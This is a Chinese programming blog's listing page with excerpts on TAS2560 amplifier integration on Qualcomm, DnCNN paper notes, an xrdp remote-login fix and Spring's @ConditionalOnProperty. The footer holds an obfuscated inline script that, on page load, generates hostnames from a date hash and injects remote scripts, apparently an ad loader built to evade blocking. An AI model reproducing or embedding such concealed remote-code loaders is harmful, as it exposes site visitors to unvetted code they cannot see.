		<a class="list__footer-readmore btn" href="/posts/32537a03b1642b7e79f96e7e9ef1d2ac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/071f903956f16bb44fc3b0df89bded75/" rel="bookmark">
			如何在手机应用的高通平台上使用TAS2560
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着智能手机产品轻薄化的流行趋势，喇叭的体积越来越局限，这样造成外放的性能很难提升。同时，音频现在是手机上非常重要的卖点，大音量和好音质是市场上非常主流的要求。所以面对这两方面的一个Tradeoff，SmartPA在市场上的需求越来越多。
SmartPA主要是通过智能的保护算法实现对喇叭振幅和喇叭温度的保护，从而充分发挥喇叭的潜力，在有限的喇叭空间的情况下实现大音量和好音质。这一部分TI的解决方案主要包括TAS2557, TAS2560和TAS2559。对于单声道方案而言，主要是内置DSP的TAS2557和不带DSP的TAS2560。对于内置DSP的方案而言，保护算法是跑在芯片内部的DSP上，所以实现相对而言更容易。那对于没有DSP的方案来说，保护算法是需要跑在平台端的DSP上，那本文主要就是针对这种应用，介绍下TAS2560如何在高通平台上使用。
第一个步骤主要是要确认项目的实际需求，主要包括以下几点：
项目是单声道还是立体声？
I2S是多少位？具体是什么格式？
最大采样率是多少？一般是48K或者44.1K。
确认算法相关参数的存放位置，是直接用bin file还是用高通默认的acdb文件？
对SmartPA使用，需要几种使用场景？
工厂校验的要求：是否有标准的测试流程和测试音源？除了Re校验外，是否还有其他要求？
第二个步骤主要是TAS2560 driver的集成。这一部分TI提供标准的参考代码，实现起来相对容易，目标是要实现Speaker的正常出声。在这个阶段，可以直接对一些电气特性做一些测试，例如THD+N，底噪等来确认音频通路是否正常。这其中以下几点需要注意：
确认平台输出I2S信号的格式，最好通过示波器重新确认。
注意TAS2560侧PLL的设定，如果有noise问题，建议首先确认PLL是否正确。
在driver里面需要知道喇叭的直流阻抗值范围。
第三个步骤是算法在高通平台的porting，主要的工作，如下图示，是把我们的智能功放的算法库和相对应的Framework集成到高通平台的ADSP端，一般来说ADSP是直接集成在主平台内。详细步骤如下所示：
在平台端使能I2S的TX port，TX通路是指从TAS2560反馈回来给到平台的通路。
确认反馈的IV信号是否正确。
DSP侧和AP侧相关的代码实现，这部分也是有相关的参考代码可供参考。
PPC3的安装，并保证PPC3和手机侧的通讯正常。PPC3是TI提供的专业图形化界面工具，具体界面参考以下。
工厂校验代码的实现，特别注意在做校验的时候需要关闭音频通路上的算法。
算法验证，这一部分TI也会提供标准的验证流程。
第四个步骤是建模和调音，这一部分主要包括以下几步：
提供喇叭Xmax , Tmax, Tcoef, BL and Sd的具体参数和相关的规格书。
准备开孔的喇叭并利用PPC3进行建模。
调音工程师进行粗调。
整机和喇叭确认后，在整机的基础上做进一步建模并做细调。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/633d4477369693ca018e240ecdf575ca/" rel="bookmark">
			DnCNN论文阅读笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章重点：
提出了一个前馈去噪卷积神经网络（DnCNN）用于图像的去噪，使用了更深的结构、残差学习算法、正则化和批量归一化等方法提高去噪性能。优势是可以处理未知噪声水平的高斯去噪。
传统方法：
（1）通过建模图像先验，建立去噪模型：
缺点：涉及复杂的优化，耗时；
模型一般非凸，并且需要手动设计参数，很难达到最优去噪性能。
（2）辨别学习方法学习图像先验模型：
优点：能够摆脱迭代优化过程；
CSF和TNRD在计算效率和去噪质量之间的差距有了很好的效果
缺点：在捕获图像结构的所有特征上受到限制；
许多手动参数被涉及到；
模型被盲图像去噪限制。
DnCNN：
图像去噪：从一个由噪声的图像y=x+v中，恢复干净的图像x。
图像去噪视为一种判别学习问题：（DnCNN）通过卷积神经网络将图像与噪声分离。
CNN优点：
第一：非常深的结构提高利用图像特征的容量和灵活方面是非常有效的
第二：训练CNN的正则化和学习方面取得了相当大的进展，ReLU、批量归一化、残差学习，提高去噪性能
第三：适合GPU的并行运算。提高运行时的性能
DnCNN优点：
第一：在特定的噪声水平下训练比最先进的方法如BM3D，WNNM和TNRD有更好的高斯去噪效果。
第二：对于盲高斯去噪，比为特定噪声水平训练的BM3D和TNRD表现的更好。
第三：当被延伸到一些一般的图像去噪任务时，也能获得很好的结果。
第四：一个DnCNN模型对于三个一般图像去噪任务的高效性，即高斯去噪，有着多重升级因子的SISR和有着不同质量因子的JPEG去块问题。
这项工作的贡献：
第一：为高斯去噪提出了一个端到端的可训练的很深的卷积神经网络
第二：发现残差学习和批量归一化可以使卷积神经网络学习极大的获益
第三：DnCNN可以轻松扩展以处理一般的图像去噪任务
图像去噪的深度神经网络：
已经存在通过深度神经网络来处理去噪问题的模型，如：MLP和TNRD。但是，他们都是针对特定噪声水平训练特定模型。开发CNN进行一般图像去噪仍然没有研究。
残差学习和批量归一化：
残差学习：DnCNN使用单个残差单元来预测残差图像
关于残差学习的一些知识：
更深的网络可以进行更加复杂的特征模式的提取，从而理论上更深的网络可以得到更好的结果。但是通过简单的叠加层的方式来增加网络深度，可能引来梯度消失/梯度爆炸的问题，随着网络深度的增加，也会带来两个问题：
长时间训练但是网络收敛变得非常困难甚至不收敛（这个问题很大程度已被标准初始化和中间标准化层解决）。网络性能会逐渐趋于饱和，甚至还会开始下降，56层的误差比20层的更多，故这种现象并不是由于过拟合造成的。这种现象称为深度网络的退化问题。 而残差网络就可以让网络层次很深的时候，网络依然有很好的性能和效率。
残差学习的结构如下：
可以看到右边加入的是前向反馈identity mapping（恒等映射y=x），原来的网络是学习输入到输出的映射H(x)，残差网络学习的是F(x)=H(x)−x。
为什么残差学习相对容易？直观上残差学习的内容较少。从数学角度分析，
在残差网络中有一点变化：我们将a[l]直接向后拷贝到神经网络的深层，在Relu非线性激活前加上a[l]，这是一条捷径将a[l]的信息直接传达到神经网络的深层（不再沿着主路经传递）
所以如何将一个普通网络变成残差网络呢？
这就构成了一个残差块：
这个图中就有五个残差块，构成一个残差网络： 所以，a[l+2]=g(z[l+2]+a[l])，如果z[l+2]=0，那么a[l+2]=a[l]。这说明即使增加两层，它的效率也不逊色于简单的神经网络。所以给大型神经网络增加两层，不论是把残差块添加到神经网络的中间还是末端位置都不会影响网络的实现。此外，如果这些隐层单元学到一些有用信息，那么它可能比学习恒等函数变现的更好。
批量归一化：解决内部协变量移位问题，加快训练速度，更好的性能和对初始化的低灵敏度。
有关批量归一化的知识：
为什么需要归一化呢？
神经网络学习过程本质就是为了学习数据分布，一旦训练数据与测试数据的分布不同，那么网络的泛化能力也大大降低；另外一方面，一旦每批训练数据的分布各不相同(batch 梯度下降)，那么网络就要在每次迭代都去学习适应不同的分布，这样将会大大降低网络的训练速度。
Batch Normalization：
算法本质原理就是：在网络的每一层输入的时候，又插入了一个归一化层，也就是先做一个归一化处理，比如网络第三层输入数据X3(X3表示网络第三层的输入数据)把它归一化至：均值0、方差为1，然后再进入网络的下一层。
算法介绍：虽然要解决中间层分布的问题，但是也要这一层学习到的分布不被破坏，所以采用了变换重构的方式，引入了可学习参数γ、β
当参数如上时是可以恢复出原始的某一层所学到的特征的。
最后Batch Normalization网络层的前向传导过程公式就是：
上面的公式中m指的是mini-batch size。
在cnn中我们可以把每个特征图看成是一个特征处理（一个神经元），因此在使用Batch Normalization，mini-batch size 的大小就是：m特征图宽特征图高，于是对于每个特征图都只有一对可学习参数：γ、β。
残差学习和批量归一化的整合可以带来快速稳定的训练和更好的去噪性能。
DnCNN模型 ：
网络深度：
根据与其他模型的比较，我们将DnCNN的感受野大小设置为35x35，相应的深度为17。对于其他一般图像的去噪任务，我们将采用更大的感受野并将深度设置为20.
网络架构：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/633d4477369693ca018e240ecdf575ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/952e3925a5897cfea0aba47b7d42e9bb/" rel="bookmark">
			Linux xrdp 问题（解决远程访问失败问题）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		开发中偶发机器无法远程登录服务器，本地启用mstsc连接失败，解决方法如下：
基本命令如下：
502 mount -o remount ,rw / 503 mount 504 systemctl start xrdp 505 ls 506 systemctl status xrdp 507 /etc/init.d/smbd restart 查看xrdp状态，发现进程挂掉 2. 查看主分区，发现主分区权限为只读，正常是读写权限
3. 查看失败原因：分区挂载失败，导致远程失败
4. 手动挂载主分区
5. 重启xrdp，恢复正常
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5a97231a9bb23625707a12509a95ead/" rel="bookmark">
			@ConditionalOnProperty的作用和用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@ConditionalOnProperty的作用和用法 在spring boot中有时候需要控制配置类是否生效,可以使用@ConditionalOnProperty注解来控制@Configuration是否生效.
配置类代码: @Configuration @ConditionalOnProperty(prefix = "filter",name = "loginFilter",havingValue = "true") public class FilterConfig { //prefix为配置文件中的前缀, //name为配置的名字 //havingValue是与配置的值对比值,当两个值相同返回true,配置类生效. @Bean public FilterRegistrationBean getFilterRegistration() { FilterRegistrationBean filterRegistration = new FilterRegistrationBean(new LoginFilter()); filterRegistration.addUrlPatterns("/*"); return filterRegistration; } } 配置文件中的代码 filter.loginFilter=true 测试 当配置文件中值为true时:输出了"过滤器"三个字,说明loginFilter生效了,说明配置类生效了.
当配置文件中值为false时:没有输出了"过滤器"三个字,说明loginFilter没有生效,说明配置类没有生效.
总结: 通过@ConditionalOnProperty控制配置类是否生效,可以将配置与代码进行分离,实现了更好的控制配置.
@ConditionalOnProperty实现是通过havingValue与配置文件中的值对比,返回为true则配置类生效,反之失效.
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/468/">«</a>
	<span class="pagination__item pagination__item--current">469/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/470/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>